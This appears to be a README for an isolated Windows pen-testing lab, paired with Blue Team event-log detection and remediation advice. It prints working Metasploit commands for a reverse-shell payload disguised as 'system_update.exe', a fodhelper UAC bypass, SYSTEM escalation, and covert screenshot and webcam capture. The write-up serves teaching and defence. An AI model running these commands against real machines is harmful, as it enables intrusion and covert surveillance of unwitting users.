# Windows 10/11 Endpoint Penetration Testing & Post-Exploitation Lab

An end-to-end offensive and defensive cybersecurity lab demonstrating how a 64-bit Windows 10/11 endpoint can be compromised when baseline host protections (Microsoft Defender and Windows Firewall) are disabled, and how a Blue Team can detect each stage of the intrusion in Windows Event Viewer.

This repository includes the full technical assessment report (`Report.pdf`) with step-by-step terminal outputs, post-exploitation proof-of-concept captures, forensic event log correlation, and an enterprise remediation plan.

## What This Project Demonstrates

1. **64-Bit Payload Generation (`msfvenom`):** Crafting a staged 64-bit reverse TCP Meterpreter executable (`system_update.exe`, 7,680 bytes) packaged inside a ZIP archive (`Folder 4540.zip`) to simulate a social-engineering delivery vector.
2. **Initial Access & Session Management (`exploit/multi/handler`):** Capturing an initial standard-user reverse shell (**Meterpreter Session 1**) on TCP port `4444` and extending session communication timeouts (`--timeout 300`).
3. **Silent UAC Bypass (`bypassuac_fodhelper`):** Abusing the trusted auto-elevating Windows binary `C:\WINDOWS\System32\fodhelper.exe` via registry hijacking to spawn a high-integrity administrative session (**Meterpreter Session 2**) on TCP port `4445` without triggering a UAC prompt.
4. **SYSTEM Privilege Escalation (`getsystem`):** Elevating from local Administrator to `NT AUTHORITY\SYSTEM` via Technique 1 (*Named Pipe Impersonation*), profiling the host with `sysinfo`, and testing process migration into `explorer.exe` and `winlogon.exe`.
5. **Post-Exploitation & Live Surveillance:**
   - Executing a hidden PowerShell process (`execute -H -f powershell.exe`, PID `7724`) to display a proof-of-concept surveillance alert dialog (`"Your computer is under surveillance by Rifat!"`) on the victim's desktop.
   - Capturing live desktop screenshots (`screenshot`).
   - Enumerating attached camera hardware (`webcam_list` -> `HP TrueVision HD Camera`) and silently capturing a live frame (`webcam_snap`).
6. **Blue Team Forensics (Windows Event Viewer):** Analysing the Windows `Security` log immediately after exploitation to correlate real-time indicators of compromise (**Event IDs 4624, 4672, and 5379**), alongside process creation (`4688`), PowerShell script block logging (`4104`), and audit log clearing (`1102`).

## Lab Environment & Network Topology

All testing was performed inside a completely isolated virtual network (`192.168.0.0/24`) containing two machines:

| Role | Operating System / Details | IPv4 Address | Key Tools / Components |
| :--- | :--- | :--- | :--- |
| **Attacker Machine** | Kali Linux x64 (`rifat@kali`) | `192.168.0.100/24` (`eth0`) | Metasploit Framework (`v6.4.112-dev`), `msfvenom`, `Meterpreter` |
| **Target Endpoint** | Windows 10 22H2+ (x64, Build 19045) (`DESKTOP-[REDACTED]\rifat`) | `192.168.0.195/24` (Wi-Fi) | PowerShell, `fodhelper.exe`, Windows Event Viewer |

## Attack Chain Walkthrough

### Phase 1 — Target Preparation
To focus the lab on privilege escalation, post-exploitation mechanics, and forensic telemetry rather than signature evasion, **Microsoft Defender Real-Time Protection** (and Dev Drive Protection) as well as **Windows Defender Firewall** (Private and Public profiles) were temporarily turned off on the target VM.

### Phase 2 — 64-Bit Payload Generation
Generated a 64-bit reverse TCP Meterpreter payload on Kali Linux configured to connect back to `192.168.0.100:4444`:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe > system_update.exe
```

### Phase 3 — Listener Setup & Initial Access (Session 1)
Configured the Metasploit handler on port `4444` to receive the connection when `system_update.exe` was executed on the Windows target, then extended the session timeout to 300 seconds:

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.0.100
set LPORT 4444
exploit
background
sessions --interact 1 --timeout 300
```

### Phase 4 — Silent UAC Bypass via `fodhelper.exe` (Session 2)
Backgrounded Session 1 and used `bypassuac_fodhelper` (`TARGET 1` for 64-bit Windows) on port `4445` to bypass User Account Control without any user consent prompt:

```text
use exploit/windows/local/bypassuac_fodhelper
set SESSION 1
show targets
set TARGET 1
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.0.100
set LPORT 4445
run
```

### Phase 5 — `NT AUTHORITY\SYSTEM` Escalation & Host Profiling
Inside the elevated session, escalated to `NT AUTHORITY\SYSTEM` via Named Pipe Impersonation (`getsystem`), verified identity (`getuid`), enumerated system information (`sysinfo`), and tested process migration:

```text
getsystem
getuid
sysinfo
migrate -N explorer.exe
```

### Phase 6 — Post-Exploitation & Surveillance Demonstration
Across the active Meterpreter sessions (`Sessions 1, 3, and 4`), demonstrated real-world impact through UI injection, screen capture, and webcam access:

```text
# 1. Spawn a hidden PowerShell process (PID 7724) to display a desktop alert box
execute -H -f powershell.exe -a "-Command \"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Your computer is under surveillance by Rifat!', 'Windows Security')\""

# 2. Capture live desktop screenshots
screenshot

# 3. Enumerate and capture from the target's integrated webcam (HP TrueVision HD Camera)
webcam_list
webcam_snap
```

## Blue Team Detection & Event Log Forensics

Inspection of **Windows Event Viewer** (`Windows Logs > Security`) immediately after the attack confirmed that high-fidelity forensic artefacts are recorded in real time:

| Event ID | Log Channel | Category / Phase | Forensic Significance |
| :--- | :--- | :--- | :--- |
| **4624** | Security | Logon (Session Setup) | **Observed in Lab:** Successful logon recorded during Meterpreter session creation and `getsystem` pipe impersonation. |
| **4672** | Security | Special Logon (Privilege Escalation) | **Observed in Lab:** Administrative / `SYSTEM` privileges assigned to a new logon session during `fodhelper.exe` UAC bypass and `getsystem`. |
| **5379** | Security | User Account Management | **Observed in Lab:** Windows Credential Manager credentials read or enumerated during post-exploitation activity. |
| **4688** | Security | Process Creation | Captures newly spawned processes (`system_update.exe`, auto-elevated `fodhelper.exe`, and hidden `powershell.exe`). |
| **4104** | PowerShell | Script Block Logging | Records the full PowerShell script block used to trigger the desktop `MessageBox`. |
| **1102** | Security | Audit Log Cleared | Generated immediately if an attacker runs `clearev` to wipe local Event Viewer logs. |

## Vulnerability Matrix & Remediation Summary

| Vulnerability / Technique | Severity | Recommended Defense / Remediation |
| :--- | :--- | :--- |
| **Disabled Endpoint Protection** (Defender & Firewall Off) | **CRITICAL** | Enforce Microsoft Defender Real-Time Protection and **Tamper Protection** via Group Policy or Microsoft Intune. |
| **Silent UAC Bypass via `fodhelper.exe`** | **HIGH** | Remove standard users from the local Administrators group (Least Privilege) and set UAC policy to **Always Notify**. |
| **Unrestricted Reverse Shell Egress** (Ports `4444` / `4445`) | **HIGH** | Lock Windows Firewall profiles via GPO and enforce strict outbound firewall filtering on non-standard TCP ports. |
| **`getsystem` Impersonation & Process Injection** | **HIGH** | Deploy an **EDR** solution (e.g., Microsoft Defender for Endpoint, CrowdStrike Falcon) to block anomalous `fodhelper.exe` child processes, pipe impersonation, and `explorer.exe` injection. |
| **Hidden PowerShell & Webcam Surveillance** | **HIGH** | Enforce PowerShell **Constrained Language Mode** and **Script Block Logging (Event ID 4104)**; restrict background camera access via GPO. |
| **Local-Only Security Event Logs** | **MEDIUM** | Forward Security and PowerShell logs in real time to a central **SIEM** (e.g., Microsoft Sentinel, Splunk) so local log clearing (`clearev`) is ineffective. |

## Repository Contents

- `Report.pdf` — Complete 10-page illustrated technical assessment report containing all terminal screenshots, desktop proof captures, forensic log analysis, and remediation guidelines (sensitive host identifiers blurred for privacy).
- `README.md` — Project overview, attack chain summary, command reference, and defensive matrix.

## Ethical Disclaimer

All activities, payloads, and techniques documented in this repository were conducted strictly within an isolated, self-contained virtual laboratory environment for academic and educational security research. Never test these techniques on systems or networks without explicit written authorization.
